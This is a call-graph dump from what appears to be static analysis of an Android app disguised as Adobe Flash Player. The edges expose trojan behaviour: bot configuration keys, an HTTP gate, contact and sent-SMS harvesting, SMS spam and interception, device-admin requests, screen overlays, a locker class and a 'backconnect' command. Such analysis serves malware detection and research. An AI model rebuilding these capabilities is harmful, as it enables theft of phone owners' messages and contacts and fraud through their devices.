VIRTUAL edge: $r20 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
SPECIAL edge: specialinvoke $r54.<com.adobe.flashplayer_.FlashVirtual: void <init>()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.FlashVirtual: void <init>()>
VIRTUAL edge: virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r1) in <com.adobe.flashplayer_.FlashY: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>("+") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r4) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&c=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&c=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&h=macros_a_bad&i=macros_a_data") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $i0 = virtualinvoke r8.<java.lang.String: int indexOf(java.lang.String)>("setFilter") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: int indexOf(java.lang.String)>
SPECIAL edge: specialinvoke r5.<java.lang.StringBuilder: void <init>()>() in <com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: void <init>()>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("?") in <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
INTERFACE edge: $r34 = interfaceinvoke r5.<java.util.Map: java.util.Set keySet()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.util.TreeMap: java.util.Set keySet()>
SPECIAL edge: $r7 = specialinvoke r0.<com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>("BotNetwork", $r4) in <com.adobe.flashplayer_.FlashURL: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>
VIRTUAL edge: $r15 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashW: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(" sec\r") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(" [ End ] ") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r6) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&d=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: r4 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>(r4) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
VIRTUAL edge: $r23 = virtualinvoke $r53.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r30) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r36 = virtualinvoke r3.<java.io.File: java.io.File[] listFiles()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.io.File: java.io.File[] listFiles()>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r21) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&g=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r4 = virtualinvoke $r2.<android.content.Intent: java.lang.String getAction()>() in <com.adobe.flashplayer_.adobeCore: void onReceive(android.content.Context,android.content.Intent)> ==> <android.content.Intent: java.lang.String getAction()>
STATIC edge: r4 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>(r4) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r5) in <com.adobe.flashplayer_.FlashW: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r4) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&f=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r1 = virtualinvoke r3.<java.io.BufferedReader: java.lang.String readLine()>() in <com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.io.BufferedReader: java.lang.String readLine()>
SPECIAL edge: $r20 = specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String,android.content.Context)>("out", $r7) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String,android.content.Context)>
VIRTUAL edge: $r24 = virtualinvoke $r15.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>(":", "") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
VIRTUAL edge: $r17 = virtualinvoke $r17.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&h=in_call&i=") in <com.adobe.flashplayer_.FlashY: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $i0 = virtualinvoke $r5.<java.lang.String: int indexOf(java.lang.String)>(",") in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: int indexOf(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r25) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
CLINIT edge: staticinvoke <java.lang.Long: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <java.lang.Long: void <clinit>()>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&g=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke r2.<android.content.Intent: android.content.Intent putExtra(java.lang.String,android.os.Parcelable)>("android.app.extra.DEVICE_ADMIN", r3) in <com.adobe.flashplayer_.FlashARM: void onCreate(android.os.Bundle)> ==> <android.content.Intent: android.content.Intent putExtra(java.lang.String,android.os.Parcelable)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r34) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: r27 = staticinvoke <android.net.Uri: android.net.Uri parse(java.lang.String)>("content://sms/sent") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <android.net.Uri: android.net.Uri parse(java.lang.String)>
VIRTUAL edge: $r11 = virtualinvoke $r11.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>("+", "") in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
VIRTUAL edge: virtualinvoke $r32.<com.adobe.flashplayer_.FlashVirtual: android.os.AsyncTask execute(java.lang.Object[])>($r24) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <android.os.AsyncTask: android.os.AsyncTask execute(java.lang.Object[])>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&g=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&c=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r30 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r25) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r20 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r1) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>("warn", r1, $r7) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>
SPECIAL edge: $r21 = specialinvoke r0.<com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>("BotPhone", $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&f=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r54.<com.adobe.flashplayer_.FlashVirtual: void <init>()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.FlashVirtual: void <init>()>
STATIC edge: $r20 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.Prefs$navW: void <init>(com.adobe.flashplayer_.Prefs)>($r1) in <com.adobe.flashplayer_.Prefs$navW: void <init>(com.adobe.flashplayer_.Prefs,com.adobe.flashplayer_.Prefs$navW)> ==> <com.adobe.flashplayer_.Prefs$navW: void <init>(com.adobe.flashplayer_.Prefs)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r22) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("\r") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r1) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r1.<android.view.View: void <init>(android.content.Context)>(null) in <dummyMainClass: com.adobe.flashplayer_.SystemSWF dummyMainMethod_com_adobe_flashplayer___SystemSWF(android.content.Intent)> ==> <android.view.View: void <init>(android.content.Context)>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>(r4) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: r4 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $r21 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: virtualinvoke r0.<com.adobe.flashplayer.Certificate: void setContentView(int)>(2130903040) in <com.adobe.flashplayer.Certificate: void onCreate(android.os.Bundle)> ==> <android.app.Activity: void setContentView(int)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&h=backconnect_data&i=cmd") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r38 = virtualinvoke r0.<com.adobe.flashplayer_.AdobeUtil: android.content.Context getApplicationContext()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <android.content.ContextWrapper: android.content.Context getApplicationContext()>
VIRTUAL edge: $i0 = virtualinvoke r19.<java.lang.String: int indexOf(java.lang.String)>("sentSpam") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: int indexOf(java.lang.String)>
SPECIAL edge: specialinvoke r2.<java.io.BufferedReader: void <init>(java.io.Reader)>(r3) in <com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String)> ==> <java.io.BufferedReader: void <init>(java.io.Reader)>
VIRTUAL edge: r5 = virtualinvoke $r56.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r6) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r25 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $r23 = virtualinvoke $r53.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(" [ End ] ") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r17.<java.lang.StringBuilder: void <init>(java.lang.String)>("&b=") in <com.adobe.flashplayer_.FlashY: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("_") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>("&b=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
STATIC edge: staticinvoke <dummyMainClass: com.adobe.flashplayer_.FlashARM dummyMainMethod_com_adobe_flashplayer___FlashARM(android.content.Intent)>(null) in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <dummyMainClass: com.adobe.flashplayer_.FlashARM dummyMainMethod_com_adobe_flashplayer___FlashARM(android.content.Intent)>
STATIC edge: staticinvoke <dummyMainClass: com.adobe.packages.ZLocker dummyMainMethod_com_adobe_packages_ZLocker(android.content.Intent)>(null) in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <dummyMainClass: com.adobe.packages.ZLocker dummyMainMethod_com_adobe_packages_ZLocker(android.content.Intent)>
CLINIT edge: staticinvoke <android.os.Build$VERSION: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <android.os.Build$VERSION: void <clinit>()>
VIRTUAL edge: $r20 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
STATIC edge: $r37 = staticinvoke <android.telephony.SmsManager: android.telephony.SmsManager getDefault()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <android.telephony.SmsManager: android.telephony.SmsManager getDefault()>
VIRTUAL edge: $i0 = virtualinvoke r8.<java.lang.String: int indexOf(java.lang.String)>("loadSpam") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: int indexOf(java.lang.String)>
VIRTUAL edge: $i0 = virtualinvoke r19.<java.lang.String: int indexOf(java.lang.String)>("getContacts") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: int indexOf(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r1) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r16.<android.view.WindowManager$LayoutParams: void <init>(int,int,int,int,int)>($i0, $i1, 2003, 262144, $i2) in <com.adobe.flashplayer_.Prefs: void <init>(android.content.Context,java.lang.String)> ==> <android.view.WindowManager$LayoutParams: void <init>(int,int,int,int,int)>
SPECIAL edge: specialinvoke r0.<android.content.BroadcastReceiver: void <init>()>() in <com.adobe.flashplayer_.SystemSWF: void <init>()> ==> <android.content.BroadcastReceiver: void <init>()>
VIRTUAL edge: r5 = virtualinvoke $r56.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r9) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r20 = virtualinvoke r3.<java.io.File: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.io.File: java.lang.String toString()>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(";") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r24 = virtualinvoke r8.<java.lang.String: java.lang.String[] split(java.lang.String)>(" ") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String[] split(java.lang.String)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void saveData(java.lang.String,java.lang.String,android.content.Context)>($r20, "out", $r7) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: void saveData(java.lang.String,java.lang.String,android.content.Context)>
VIRTUAL edge: $i0 = virtualinvoke r8.<java.lang.String: int indexOf(java.lang.String)>("keyHttpGate") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: int indexOf(java.lang.String)>
SPECIAL edge: specialinvoke $r14.<java.lang.StringBuilder: void <init>(java.lang.String)>($r15) in <com.adobe.flashplayer_.FlashW: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $r20 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.FlashURL: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>("forceZ", "Off", $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>
SPECIAL edge: specialinvoke $r0.<com.adobe.flashplayer_.FlashARM: void <init>()>() in <dummyMainClass: com.adobe.flashplayer_.FlashARM dummyMainMethod_com_adobe_flashplayer___FlashARM(android.content.Intent)> ==> <com.adobe.flashplayer_.FlashARM: void <init>()>
SPECIAL edge: specialinvoke $r22.<java.lang.StringBuilder: void <init>(java.lang.String)>("&b=") in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: virtualinvoke $r58.<com.adobe.flashplayer_.FlashVirtual: android.os.AsyncTask execute(java.lang.Object[])>($r24) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <android.os.AsyncTask: android.os.AsyncTask execute(java.lang.Object[])>
VIRTUAL edge: $r20 = virtualinvoke r3.<java.io.File: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.io.File: java.lang.String toString()>
VIRTUAL edge: virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r1) in <com.adobe.flashplayer_.Prefs: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r53.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void saveData(java.lang.String,java.lang.String,android.content.Context)>($r24, "pcss.txt", $r7) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: void saveData(java.lang.String,java.lang.String,android.content.Context)>
VIRTUAL edge: virtualinvoke r0.<com.adobe.flashplayer_.FlashURL: void sendSMS(java.lang.String,java.lang.String)>($r21, r4) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: void sendSMS(java.lang.String,java.lang.String)>
SPECIAL edge: specialinvoke r0.<android.app.Service: void onCreate()>() in <com.adobe.flashplayer_.MacrosStat: void onCreate()> ==> <android.app.Service: void onCreate()>
SPECIAL edge: specialinvoke $r0.<com.adobe.flashplayer_.adobeCore: void <init>()>() in <dummyMainClass: com.adobe.flashplayer_.adobeCore dummyMainMethod_com_adobe_flashplayer___adobeCore(android.content.Intent)> ==> <com.adobe.flashplayer_.adobeCore: void <init>()>
VIRTUAL edge: virtualinvoke r0.<com.adobe.flashplayer_.FlashURL: void abortBroadcast()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <android.content.BroadcastReceiver: void abortBroadcast()>
SPECIAL edge: specialinvoke $r22.<java.lang.StringBuilder: void <init>(java.lang.String)>($r17) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r53.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r16) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke $r56.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r18) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r1.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.StringBuffer: void <init>()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r1) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r22 = virtualinvoke r19.<java.lang.String: java.lang.String[] split(java.lang.String)>(" ") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String[] split(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r1) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: r34 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>("") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
STATIC edge: $r24 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>("") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
SPECIAL edge: specialinvoke $r53.<java.lang.StringBuilder: void <init>(java.lang.String)>("execMod[") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("\r\r") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
